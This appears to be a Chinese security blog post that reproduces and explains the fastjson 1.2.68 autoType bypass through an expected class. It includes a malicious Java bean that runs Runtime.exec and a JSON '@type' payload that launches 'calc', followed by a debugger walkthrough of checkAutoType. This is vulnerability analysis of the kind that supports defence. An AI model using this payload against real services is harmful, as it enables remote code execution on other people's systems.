> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/_0rjaOljf2uajppziCSHgg)

**1、漏洞复现**

根据网络上的 poc 复现一下该漏洞；首先创建一个恶意类，该类必须继承或实现期望类，原因见后文。

```
package test;
import java.lang.AutoCloseable;
import java.io.IOException;
public class TestBean implements AutoCloseable{

        private String cmd;

        public String getCmd() {
            return cmd;
        }

        public void setCmd(String cmd) {
            this.cmd = cmd;
        }


        public String getTest() {
            try {
                Runtime.getRuntime().exec(cmd);
            } catch (IOException e) {
                return e.getMessage();
            }

            return null;
        }

        @Override
        public void close() throws IOException {

        }
}
payload：{"@type":"java.lang.AutoCloseable", "@type":"test.TestBean","cmd":"calc"}
```

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLK4VWJpjmibmtnkDOUrpeoB6gjLEbwHVYqRLAWoEplfqf7OmtIc1CpnnQ/640?wx_fmt=png)

**2、漏洞原理**

    该漏洞的本质是通过期望类绕过 autotype 开关的限制，反序列化达到远程代码执行的目的。首先找到 checkAutoType 实现的位置

```
com/alibaba/fastjson/parser/ParserConfig.java
```

    注意到 safemode，safemode 在 1.2.68 版本默认是不开启的，不影响代码执行进程。从代码可以看出若 safemode 为 TRUE，autoType 将被完全禁用，无视白名单。  

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLK1SPXXC9q0E2S9GHemhUIkia5omQt0EdZWY2oF6mr03W2HRyq4o6vvng/640?wx_fmt=png)

          搜索加载类的方法 loadclass，一共有四处，首先看到第一处 loadclass，这里需要满足的    条件有：

        1、不在内部白名单内

2、AutotypeSupport 为 true 或 expectClassFlag 为 true

        3、在 Hash 校验白名单内

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLKuNqtoDLI8rI8CwnWPUaWRHqduhqhV5I05ae3j9r21G0lZG010uAic0A/640?wx_fmt=png)

    第二处 loadclass 需要满足的条件为在内部白名单内（显然不可能）

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLKPiaDQItUYibS1bzHHA1Bmxk3OxSPicTicxyMuLtPqtXMsIQfqVsA0g4BKg/640?wx_fmt=png)

    第三处 loadclass 需要满足不在 hash 校验黑名单，并通过 hash 白名单的校验，在调试过程中发现 acceptHashCodes 实际上一直都是空数组。

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLKYNR7yhbAlcefCMMribDEVWgUORs2cPeZtALIArO4TRUaeKWZicNQycNA/640?wx_fmt=png)

    Hash 黑名单

    ![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLK6zbeiburUsQCzM7SaGMF1icicEkyY9lFhMMEviblHRK5qgwoah2rhhicKoQ/640?wx_fmt=png)

    第四处 loadclass，需要满足 3 个条件中的一个就可以了

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLKQHq0WH59iaib7ErXjHb2YIlmuyhDQcBbskoQJfXtx8v9XBwdebDGiatcw/640?wx_fmt=png)

```
payload：{"@type":"java.lang.AutoCloseable", "@type":"test.TestBean","cmd":"calc"}
```

 传入第一个 type，typeName 为

```
java.lang.AutoCloseable
```

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLKhQPRriaFNx8nNk0UWegVUia0IfQueHx2LicjvUdS6xG2eeSqhs84Luq2A/640?wx_fmt=png)

    首先 expectClass 为 null，expectClassFlag 为 false

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLKuQEciaJNNblYqYZfqqibnoZeHh1ib27PP1uicicBrzANF2ZVGEDLoRRiaYPQ/640?wx_fmt=png)

    从缓存中取出 AutoCloseable 类

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLKrnX19CnFlwccjH0VJh2DI8ItktGGtbNsUtBdD7ibA7P6QLlVQhicncUw/640?wx_fmt=png)

    由于 clazz 不为空，expectClass 为空，直接返回 clazz

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLKdcdKOegzO09MiawKrKbbWrKIdVrkHarBXbVknSoNu1lcmMaUGC54BSg/640?wx_fmt=png)

    ⾄此，第⼀次 checkAutoType 检查结束。将传入的 clazz 进行反序列化，并返回反序列化后的对象。这里使用到的反序列化器为 JavaBeanDeserializer，跟进 JavaBeanDeserializer。

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLKw6taanovbK76bU6FiaQ7wwaxkHTcbo9OIF25DvcpUc9R55LSWkVfbYg/640?wx_fmt=png)

    JSON.DEFAULT_TYPE_KEY 为 type，赋值给 key 为 “@type”。

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLKRwhe0mZQImberNITIGHYtxXF2T7wBWkjM4qBmwMM60ibicMicTkK4eLEg/640?wx_fmt=png)

    到这里期望类变成了 java.lang.AutoCloseable，typeName 变成了我们的恶意类 test.TestBean

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLKcIb3uQMcpGK5H1bbfBKXgwCv3DP24egjrhcuJicgLXJe8QU4v1CGwLQ/640?wx_fmt=png)

    进行第二次的 checkautotype，由于期望类不为 null，因此 expectClassFlag 为 true

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLKXE8Qq9yXy8IymZsoDzcj6iafewBUNr94xjFobib1HXNy1Qia5zu30DH1A/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLKMZwm2M9NibHczew8LKJuJpibGjrTia53uf0xpx6JqM96NnYgyBVIF4kDg/640?wx_fmt=png)

    再重复一遍之前的过程，一路 F8，第四处 loadclass 满足条件

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLK8816N7VZnlnmcmbksicYxodGsra7OLVAQDarfqDjHthuyhmEmAUr57w/640?wx_fmt=png)

    判断 clazz 是否为期望类的继承或实现类，加入缓存，并返回 clazz    

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLKcRa5xcxynoorDYdSFOHrmanBbN9qZq7bV3USwxzcFeYFPuUfyJxnLw/640?wx_fmt=png)

    返回对象 clazz 给 userType，构造反序列化器 deserializer，调用方法 deserialze 并返回一个对象 typedObject

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLKWV2WY7QwQcfuDiaiaY9qxFTw7rkCH10b1gx6uTqicWWC8EEticQWo6xiasw/640?wx_fmt=png)

    至此反序列化结束，漏洞利⽤完结

![](https://mmbiz.qpic.cn/mmbiz_png/qXbmFE2wB51iatKM7IfNoV2kWMlxWHTLK5jmnC6LgeOphxNNgGBGASPC795Ria3f4nQhvs5obt43BMkiaSvPfQD6Q/640?wx_fmt=png)

 **参考链接：**

```
https://github.com/iSafeBlue/fastjson-autotype-bypass-demo
```